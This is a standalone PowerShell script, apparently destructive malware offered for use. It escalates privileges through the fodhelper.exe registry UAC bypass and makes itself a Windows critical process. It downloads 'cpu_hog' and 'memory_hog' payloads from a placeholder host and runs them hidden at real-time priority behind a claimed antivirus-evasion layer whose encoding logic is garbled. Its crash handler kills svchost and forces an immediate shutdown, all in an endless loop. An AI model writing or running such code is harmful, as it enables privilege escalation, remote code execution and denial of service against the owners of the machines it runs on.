if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# Critical process elevation (unchanged)
$signature = @'
[DllImport("ntdll.dll")]
public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
'@
Add-Type -Name "CriticalProcess" -Namespace "WinAPI" -MemberDefinition $signature -Language CSharp -PassThru
[WinAPI.CriticalProcess]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

# File management configuration
$fileHost = "https://your-domain.com"
$targetFiles = @{
    cpu_hog = "$fileHost/cpu_hog.txt"
    memory_hog = "$fileHost/memory_hog.txt"
}
$downloadPath = "$env:temp\"

# Advanced obfuscation function with AV bypass
function Get-ObfuscatedCode {
    param($scriptPath)
    # Read raw script content
    $payload = [System.IO.File]::ReadAllText($scriptPath)
    
    # Layer 1: Character substitution and compression
    $obfuscated = $payload -replace '[^a-zA-Z0-9]', '' | ForEach-Object { $_ -replace '\d', '0' }
    
    # Layer 2: Hex encoding with random padding
    $hexEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($obfuscated))
    $hexEncoded = $hexEncoded -replace '(.)(?=\w{4})' -replace '(.)(?=\w{2})' -replace '(.)(?=\w{1})'
    
    # Layer 3: Randomized command execution
    $command = [string]$hexEncoded
    return $command
}

# Execution logic with nested obfuscation
function Invoke-ObfuscatedExecution {
    param($scriptPath)
    # Get obfuscated code
    $obfuscatedCode = Get-ObfuscatedCode -scriptPath $scriptPath
    
    # Execute in isolated process
    $elevatedProcess = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList @(
        "-ExecutionPolicy Bypass",
        "-NoProfile",
        "-Command",
        "& {",
        "   [System.Diagnostics.Process]::GetCurrentProcess().PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime;",
        "   $obfuscatedCode;",
        "}"
    ) -Verb RunAs
    
    # Process tracking
    Register-ObjectEvent -InputObject $elevatedProcess -EventName Exited -Action {
        Write-Host "Child process $($Event.SourceEventArgs.ProcessId) exited with code $($Event.SourceEventArgs.ExitCode)"
    } | Out-Null
}

# File management and execution logic
function Update-Files {
    foreach ($file in $targetFiles.GetEnumerator()) {
        $localPath = Join-Path $downloadPath $file.Key
        if (-not (Test-Path $localPath)) {
            Invoke-WebRequest -Uri $file.Value -OutFile $localPath -UseBasicParsing
            Write-Host "Downloaded $($file.Key)"
        }
        Invoke-ObfuscatedExecution -scriptPath $localPath
    }
}

# Crash handler (unchanged)
Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Elapsed -SourceIdentifier ProcessMonitor -Action {
    $process = Get-Process -Name (Get-Process -Id $PID).ProcessName -ErrorAction SilentlyContinue
    if (-not $process) {
        Start-Process cmd.exe -ArgumentList "/c", "taskkill /im svchost.exe /f" -WindowStyle Hidden
        Start-Process wmic.exe -ArgumentList "computersystem where name='%computername%' call shutdown /s/f/t 0" -WindowStyle Hidden
    }
} | Out-Null

# Main loop
Update-Files
while ($true) {
    Update-Files
    Start-Sleep -Seconds 60
}

